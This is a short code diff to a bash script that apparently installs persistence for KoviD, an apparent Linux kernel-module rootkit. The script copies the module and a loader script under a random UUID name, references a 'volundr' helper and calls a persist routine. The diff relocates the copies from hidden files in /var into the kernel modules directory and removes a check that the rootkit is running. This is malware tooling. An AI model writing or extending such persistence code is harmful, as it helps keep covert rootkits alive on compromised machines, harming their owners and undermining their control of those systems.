@@ -18,7 +18,7 @@ PREFIX=$(cd "$PREFIX"; pwd)
 
 # Defaults
 # Warning: avoid changing these variables
-INSTALL="/var"
+INSTALL="/usr/lib/modules/$(uname -r)"
 VOLUNDR=${VOLUNDR:-$PREFIX/../volundr}
 KOVID=${KOVID:-$PREFIX/../kovid.ko}
 LOADER=${LOADER:=$PREFIX/../src/loadmodule.sh}
@@ -73,8 +73,8 @@ function do_install_files_error() {
 function do_install_files() {
     local rc=0
 
-    cp -v "$KOVID" "$INSTALL"/.$UUIDGEN.ko || rc=1
-    cp -v "$LOADER" "$INSTALL"/.$UUIDGEN.sh || rc=1
+    cp -v "$KOVID" "$INSTALL"/$UUIDGEN.ko || rc=1
+    cp -v "$LOADER" "$INSTALL"/$UUIDGEN.sh || rc=1
 
     return $rc
 }
@@ -154,10 +154,6 @@ if [[ "1" -ne "$#" ]]; then
 fi
 
 check_util readelf md5sum mktemp stat
-
-if [[ ! -f /proc/kovid ]]; then
-    errexit "KoviD not running" true 1
-fi
 
 do_persist "$1"
 
